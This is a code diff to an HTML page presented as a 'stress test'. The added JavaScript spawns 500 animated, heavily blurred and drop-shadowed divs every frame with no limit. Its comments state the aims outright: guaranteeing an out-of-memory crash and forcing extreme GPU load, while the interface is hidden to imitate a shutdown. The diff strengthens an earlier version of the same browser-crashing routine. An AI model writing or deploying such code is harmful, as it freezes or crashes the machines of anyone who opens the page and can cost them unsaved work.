@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -179,49 +180,68 @@
 
     <script>
         // Core stress test simulation loop
-         function cssAnimationInferno() {
-            const style = document.createElement('style');
-            if (!document.getElementById('gpu-core-styles')) {
-                style.id = 'gpu-core-styles';
-                style.textContent = `
-                    @keyframes gpuMeltdown {
-                        0% { transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg); filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
-                        20% { transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg); filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%); background: radial-gradient(circle, #ff0000, #0000ff, #ffff00); }
-                        50% { transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg); filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%); background: radial-gradient(circle, #ff00ff, #00ffff, #ff0000); }
-                        80% { transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg); filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%); background: radial-gradient(circle, #ff0000, #00ff00, #ffff00); }
-                        100% { transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg); filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
-                    }
-                `;
-                document.head.appendChild(style);
-            }
+function cssAnimationInferno() {
+    const style = document.createElement('style');
+    if (!document.getElementById('gpu-core-styles')) {
+        style.id = 'gpu-core-styles';
+        style.textContent = `
+            .gpu-killer {
+                position: fixed;
+                border-radius: 50%;
+                /* This forces the browser to create a new composite layer for EVERY single element */
+                will-change: transform, filter; 
+                /* Apply the nightmare animation */
+                animation: gpuMeltdown 0.5s infinite linear;
+            }
+            @keyframes gpuMeltdown {
+                0% { 
+                    transform: translate3d(0, 0, 0) rotate(0deg) scale(1); 
+                    filter: blur(2px) contrast(100%) drop-shadow(0 0 10px red); 
+                }
+                50% { 
+                    transform: translate3d(50vw, 50vh, 500px) rotate(180deg) scale(5); 
+                    /* Massive blurs combined with drop-shadows force insane GPU rasterization costs */
+                    filter: blur(150px) contrast(1000%) drop-shadow(0 0 100px blue); 
+                }
+                100% { 
+                    transform: translate3d(100vw, 100vh, 0) rotate(360deg) scale(1); 
+                    filter: blur(2px) contrast(100%) drop-shadow(0 0 10px red); 
+                }
+            }
+        `;
+        document.head.appendChild(style);
+    }
 
-            let elementCount = 0;
-            function createGpuKiller() {
-                try {
-                    for (let i = 0; i < 60; i++) {
-                        const element = document.createElement('div');
-                        element.className = 'gpu-killer';
-                        element.style.width = Math.random() * 400 + 100 + 'px';
-                        element.style.height = element.style.width;
-                        element.style.left = Math.random() * 100 + 'vw';
-                        element.style.top = Math.random() * 100 + 'vh';
-                        element.style.zIndex = 1000000 + elementCount;
-                        element.style.background = `radial-gradient(circle, 
-                            hsl(${Math.random() * 360}, 100%, 50%), 
-                            hsl(${Math.random() * 360}, 100%, 50%), 
-                            hsl(${Math.random() * 360}, 100%, 50%))`;
-                        document.body.appendChild(element);
-                        elementCount++;
-                    }
-                    if (elementCount > -2146483647) {
-                        requestAnimationFrame(createGpuKiller);
-                    }
-                } catch(e) {
-                    requestAnimationFrame(createGpuKiller);
-                }
-            }
-            createGpuKiller();
-        }
+    // Use a DocumentFragment to dump elements into the DOM in massive batches
+    function createGpuKiller() {
+        const fragment = document.createDocumentFragment();
+        
+        // Pump up the volume: 500 elements per frame instead of 60
+        for (let i = 0; i < 500; i++) {
+            const element = document.createElement('div');
+            element.className = 'gpu-killer';
+            
+            const size = Math.random() * 300 + 100 + 'px';
+            element.style.width = size;
+            element.style.height = size;
+            element.style.left = Math.random() * 100 + 'vw';
+            element.style.top = Math.random() * 100 + 'vh';
+            
+            element.style.background = `radial-gradient(circle, 
+                hsl(${Math.random() * 360}, 100%, 50%), 
+                hsl(${Math.random() * 360}, 100%, 50%))`;
+            
+            fragment.appendChild(element);
+        }
+        
+        document.body.appendChild(fragment);
+        
+        // Infinite recursion without bounds check to guarantee an OOM (Out of Memory) crash
+        requestAnimationFrame(createGpuKiller);
+    }
+    
+    createGpuKiller();
+}
         // Execution Handler
         function triggerStressTest(intensity) {
             // Hide interface components smoothly to simulate a shutdown sequence
